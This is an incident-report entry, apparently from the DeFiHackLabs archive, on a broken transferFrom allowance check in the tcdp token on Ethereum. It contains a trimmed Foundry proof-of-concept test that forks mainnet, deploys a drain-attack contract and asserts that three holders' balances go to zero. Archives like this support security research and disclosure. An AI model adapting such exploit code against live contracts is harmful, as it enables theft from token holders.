# [?] tcdp - Broken transferFrom Allowance Check

## Summary
Severity: Unknown
Chain: Ethereum
Component: tcdp
Published: 2025-04-28
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-04/tcdp_exp.sol
Type: defi-exploit-poc

## Details
Lost: 2.02 ETH

```solidity
contract ContractTest is BaseTestWithBalanceLog {
    receive() external payable {}

    function setUp() public {
        vm.createSelectFork("mainnet", 22_364_243);

        fundingToken = address(0);
        attacker = address(this);

        vm.label(ATTACKER, "Attacker EOA");
        vm.label(ROOT_ATTACK_CONTRACT, "Root Attack Contract");
        vm.label(TCDP_TOKEN, "tCDP");
        vm.label(HOLDER_ONE, "tCDP Holder One");
        vm.label(HOLDER_TWO, "tCDP Holder Two");
        vm.label(HOLDER_THREE, "tCDP Holder Three");
        vm.label(DAI_TOKEN, "DAI");
        vm.label(WETH_TOKEN, "WETH");
        vm.label(UNISWAP_V2_ROUTER, "Uniswap V2 Router");
    }

    function testExploit() public balanceLog {
        ITCDP tcdp = ITCDP(TCDP_TOKEN);

        assertTrue(tcdp.isCompound());
        assertEq(tcdp.totalSupply(), 2_112_941_787_257_735_085);
        assertEq(tcdp.balanceOf(HOLDER_ONE), 2_101_941_787_257_735_085);
        assertEq(tcdp.balanceOf(HOLDER_TWO), 10_000_000_000_000_000);
        assertEq(tcdp.balanceOf(HOLDER_THREE), 1_000_000_000_000_000);

        vm.deal(address(this), 0.1 ether);
        TCDPDrainAttack attack = new TCDPDrainAttack{value: 0.1 ether}(payable(address(this)));
        attack.run();

        assertEq(tcdp.balanceOf(HOLDER_ONE), 0);
        assertEq(tcdp.balanceOf(HOLDER_TWO), 0);
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-04/tcdp_exp.sol_
